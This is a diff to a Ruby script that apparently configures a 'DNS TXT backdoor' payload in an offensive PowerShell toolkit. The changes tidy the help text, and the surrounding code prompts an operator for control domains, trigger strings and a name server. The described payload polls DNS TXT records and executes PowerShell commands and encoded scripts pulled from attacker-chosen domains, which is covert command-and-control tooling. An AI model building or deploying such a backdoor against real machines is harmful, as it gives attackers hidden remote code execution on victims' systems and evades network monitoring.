@@ -380,13 +380,13 @@ def dns_txt_backdoor
   puts"\nThis payload acts a backdoor and is capable of receiving PowerShell scripts and commands from DNS TXT queries.".bold
   puts"\nThis payload continuosly queries DNS TXT records of a given domain. It takes further action based on the response recieved."
   puts"This payload continuously queries a subdomain's TXT records. For a response for option \"startstring\" it queries another subdomain for command to execute."
-  puts"For a response for option \"startps\" it psdomain for Base64 encoded powershell script and then pulls and executex the script."
-  puts"Use the StringToBase64 script in extras directory to encode scripts to base64. If you face problems try making a one line script separated by semi-colon \";\""
+  puts"For a response for option \"startps\" it queries psdomain for encoded powershell script and then pulls and executes the script."
+  puts"Use the Invoke-Encode script in extras directory to encode scripts, some useful scripts could be found here (https://github.com/samratashok/nishang)."
   startdomain = input("The domain (or subdomain) whose TXT records would be checked regularly for instructions (e.g. start.alteredsecurity.com: ")
   startcommand = input("The string, if responded by TXT record of above domain, will make the payload query another domain for commands (e.g. startcommand): ")
   commanddomain = input("The domain whose TXT records would be used as commands to PowerShell (e.g. command.alteredsecurity.com): ")
   startps = input("The string, if responded by TXT record of startdomain, will make the payload query another domain for encoded PowerShell Script.(e.g. startps): ")
-  psdomain = input("The domain TXT records of domain would be used to fetch encoded powershell script (e.g. script.alteredsecurity.com: ")
+  psdomain = input("The domain TXT records of domain would be used to fetch encoded powershell script (e.g. encscript.alteredsecurity.com: ")
   stopstring = input("The string, if responded by TXT record of startdomain, will stop the payload: ")
   authns = input("IP address of the Auhtorized Name Server of domains being used in above options: ")
   outopt,username,password,devkey = outoption()
